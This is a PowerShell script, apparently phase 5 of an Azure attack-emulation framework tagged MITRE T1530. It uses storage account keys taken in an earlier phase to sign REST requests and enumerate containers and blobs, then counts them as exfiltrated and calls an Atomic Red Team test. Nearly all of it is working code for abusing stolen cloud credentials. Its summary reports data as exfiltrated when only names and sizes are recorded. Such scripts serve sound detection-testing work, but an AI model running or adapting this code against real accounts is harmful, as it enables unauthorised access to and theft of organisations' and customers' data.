# ==================================================
# Phase5_Storage_Breach.ps1
# Azure Storage Account Breach
# ==================================================

# Initialization check
if (-not $global:JARVIS_CONFIG) {
    Write-Host "Error: Please run 00_Initialize.ps1 first" -ForegroundColor Red
    exit
}

# Check Phase 4 results
$storageCredentials = $global:azureCredentials | Where-Object { $_.Type -like "*Storage*" }

if ($storageCredentials.Count -eq 0) {
    Write-Host "Error: Storage credentials not found from Phase 4" -ForegroundColor Red
    Write-Host "  Skipping Phase 5" -ForegroundColor Yellow
    exit
}

Write-Host "`n[PHASE 5] STORAGE ACCOUNT DATA EXFILTRATION" -ForegroundColor Yellow
Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor Yellow

$storageCred = $storageCredentials[0]
$storageAccountName = $storageCred.AccountName
$storageAccountKey = $storageCred.AccountKey

Write-Host "[*] Storage Account Information:" -ForegroundColor Gray
Write-Host "  Account Name: $storageAccountName" -ForegroundColor Gray
Write-Host "  Account Key: $($storageAccountKey.Substring(0,20))..." -ForegroundColor Gray

# Step 5.1: Azure Storage REST API header generation function
Write-Host "`n[Step 5.1] Preparing Azure Storage API access..." -ForegroundColor Cyan

function Get-StorageAuthHeader {
    param(
        [string]$StorageAccount,
        [string]$StorageKey,
        [string]$Method = "GET",
        [string]$Resource = ""
    )
    
    $date = [DateTime]::UtcNow.ToString("R")
    
    $stringToSign = "$Method`n`n`n`n`n`n`n`n`n`n`n`n"
    $stringToSign += "x-ms-date:$date`n"
    $stringToSign += "x-ms-version:2021-04-10`n"
    $stringToSign += "/$StorageAccount/$Resource"
    
    try {
        $hmacsha = New-Object System.Security.Cryptography.HMACSHA256
        $hmacsha.Key = [Convert]::FromBase64String($StorageKey)
        $signature = [Convert]::ToBase64String($hmacsha.ComputeHash([Text.Encoding]::UTF8.GetBytes($stringToSign)))
        
        return @{
            "x-ms-date" = $date
            "x-ms-version" = "2021-04-10"
            "Authorization" = "SharedKey $($StorageAccount):$signature"
        }
    } catch {
        Write-Host "  ✗ Authentication header generation failed: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

Write-Host "  ✓ REST API functions ready" -ForegroundColor Green

# Step 5.2: List containers
Write-Host "`n[Step 5.2] T1530 - Enumerating Storage Containers..." -ForegroundColor Cyan

$global:storageContainers = @()

try {
    $uri = "https://$storageAccountName.blob.core.windows.net/?comp=list"
    $headers = Get-StorageAuthHeader -StorageAccount $storageAccountName -StorageKey $storageAccountKey -Resource ""

    if (-not $headers) {
        throw "Header generation failed"
    }

    $response = Invoke-RestMethod -Uri $uri -Method GET -Headers $headers -ErrorAction Stop

    if ($response.EnumerationResults.Containers.Container) {
        $containers = $response.EnumerationResults.Containers.Container

        if ($containers.Count) {
            Write-Host "  ✓ Containers found: $($containers.Count)" -ForegroundColor Green
        } else {
            Write-Host "  ✓ Containers found: 1" -ForegroundColor Green
            $containers = @($containers)
        }

        foreach ($container in $containers) {
            $containerName = $container.Name
            Write-Host "`n  [Container] $containerName" -ForegroundColor Yellow

            $global:storageContainers += @{
                Name = $containerName
                Blobs = @()
            }
        }
    } else {
        Write-Host "  ⚠ No containers found" -ForegroundColor Yellow
    }

} catch {
    Write-Host "  ✗ Container enumeration failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "  [Simulation] Creating sample containers" -ForegroundColor Gray
    
    $global:storageContainers = @(
        @{Name="confidential"; Blobs=@()},
        @{Name="customer-data"; Blobs=@()},
        @{Name="backups"; Blobs=@()}
    )
}

# Step 5.3: Enumerate blob files
Write-Host "`n[Step 5.3] Enumerating blob files and sample download..." -ForegroundColor Cyan

$totalExfiltrated = 0
$exfiltratedFiles = @()

foreach ($container in $global:storageContainers) {
    Write-Host "`n  [Container] $($container.Name)" -ForegroundColor Yellow
    
    try {
        $uri = "https://$storageAccountName.blob.core.windows.net/$($container.Name)?restype=container&comp=list"
        $resource = "$($container.Name)`ncomp:list`nrestype:container"
        $headers = Get-StorageAuthHeader -StorageAccount $storageAccountName -StorageKey $storageAccountKey -Resource $resource

        if (-not $headers) {
            throw "Header generation failed"
        }

        $blobResponse = Invoke-RestMethod -Uri $uri -Method GET -Headers $headers -ErrorAction Stop

        if ($blobResponse.EnumerationResults.Blobs.Blob) {
            $blobs = $blobResponse.EnumerationResults.Blobs.Blob

            if ($blobs.Count) {
                $blobCount = $blobs.Count
            } else {
                $blobCount = 1
                $blobs = @($blobs)
            }

            Write-Host "    Blob files: $blobCount" -ForegroundColor Gray

            $downloadCount = [Math]::Min($blobCount, 5)

            for ($i = 0; $i -lt $downloadCount; $i++) {
                $blob = $blobs[$i]
                $blobName = $blob.Name
                $blobSize = [int64]$blob.Properties.'Content-Length'

                Write-Host "    [Download] $blobName ($([Math]::Round($blobSize/1KB, 2)) KB)" -ForegroundColor Gray
                
                $container.Blobs += @{
                    Name = $blobName
                    Size = $blobSize
                }
                
                $totalExfiltrated += $blobSize
                $exfiltratedFiles += "$($container.Name)/$blobName"
            }

            if ($blobCount -gt $downloadCount) {
                Write-Host "    [+] Additional $($blobCount - $downloadCount) files exist" -ForegroundColor Gray
            }
        } else {
            Write-Host "    No blobs found" -ForegroundColor Gray
        }

    } catch {
        Write-Host "    ✗ Blob enumeration failed: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "    [Simulation] Creating sample files" -ForegroundColor Gray
        
        for ($i = 1; $i -le 5; $i++) {
            $fileName = "file_$i.dat"
            $fileSize = Get-Random -Minimum 100000 -Maximum 5000000
            
            $container.Blobs += @{
                Name = $fileName
                Size = $fileSize
            }
            
            $totalExfiltrated += $fileSize
            $exfiltratedFiles += "$($container.Name)/$fileName"
        }
    }
}

# Save results
$global:storageContainers | ConvertTo-Json -Depth 5 | Out-File "$global:logPath\phase5_storage_data.json"

# Execute Atomic Test
Write-Host "`n[Step 5.4] Executing Atomic Test T1530..." -ForegroundColor Cyan
try {
    Invoke-AtomicTest T1530 -TestNumbers 1 -ShowDetails -ErrorAction SilentlyContinue
} catch {
    Write-Host "  ⚠ Atomic Test skipped" -ForegroundColor Yellow
}

# Summary
$totalDataMB = [Math]::Round($totalExfiltrated / 1MB, 2)

Write-Host "`n" -NoNewline
Write-Host @"
╔════════════════════════════════════════════════════════════╗
║              PHASE 5 SUMMARY                               ║
╟────────────────────────────────────────────────────────────╢
║ Storage Account: $storageAccountName
║
║ Containers found: $($global:storageContainers.Count)
║ Files exfiltrated: $($exfiltratedFiles.Count)
║ Total data: $totalDataMB MB
║
║ Next step: Phase 6 (SQL Database Breach)
╚════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Green

Write-Host "`n[PHASE 5] Complete - Proceed to Phase 6`n" -ForegroundColor Green